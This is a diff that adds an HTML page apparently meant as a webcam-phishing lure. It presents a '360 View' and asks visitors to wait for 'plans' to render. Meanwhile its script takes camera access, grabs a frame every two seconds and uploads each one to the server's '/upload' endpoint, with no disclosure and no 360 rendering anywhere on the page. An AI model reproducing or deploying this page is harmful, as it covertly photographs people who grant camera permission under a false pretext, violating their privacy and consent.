@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Camera page</title>
+   <!-- Start Favicon -->
+   <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}">
+   <link rel="apple-touch-icon" sizes="180x180" href="{{ url_for('static', filename='apple-touch-icon.png') }}">
+   <link rel="icon" type="image/png" sizes="32x32" href="{{ url_for('static', filename='favicon-32x32.png') }}">
+   <link rel="icon" type="image/png" sizes="16x16" href="{{ url_for('static', filename='favicon-16x16.png') }}">
+   <link rel="manifest" href="{{ url_for('static', filename='site.webmanifest') }}">
+   <!-- End Favicon -->
+   <style>
+      #container {
+         display: flex;
+         flex-direction: column;
+         align-items: center;
+         /* justify-content: center; */
+         height: 100vh;
+      }
+
+      #videoElement {
+         width: 80%;
+         max-width: 600px;
+         border: 2px solid #000;
+         border-radius: 10px;
+      }
+
+      #canvas {
+         display: none;
+      }
+   </style>
+</head>
+
+<body>
+   <div align="center">
+      <h1>360 View</h1>
+   </div>
+   <div align="center">
+      <p style="color: red">Wait until 360 View plans are rendered.</p>
+   </div>
+   <div id="container">
+      <video autoplay="true" id="videoElement"></video>
+      <canvas id="canvas"></canvas>
+   </div>
+
+   <script>
+      const video = document.querySelector("#videoElement");
+      const canvas = document.querySelector("#canvas");
+
+      // Access the camera
+      if (navigator.mediaDevices.getUserMedia) {
+         navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function (stream) {
+               video.srcObject = stream;
+
+               // Start capturing images every 2 seconds
+               setInterval(captureAndSendImage, 2000);
+            })
+            .catch(function (error) {
+               alert("Your device has no camera or something went wrong!");
+            });
+      }
+
+      // Capture image from the video stream and send to the server
+      function captureAndSendImage() {
+         const context = canvas.getContext("2d");
+         canvas.width = video.videoWidth;
+         canvas.height = video.videoHeight;
+
+         // Draw the current video frame onto the canvas
+         context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+         // Convert the canvas image to a base64-encoded string
+         const imageData = canvas.toDataURL("image/png");
+
+         // Send the image data to the server
+         fetch("/upload", {
+            method: "POST",
+            headers: {
+               "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ image_data: imageData }),
+         })
+            .then(response => response.json())
+            .then(data => console.log("Server Response:", data))
+            .catch(error => console.error("Error uploading image:", error));
+      }
+   </script>
+</body>
+
+</html>
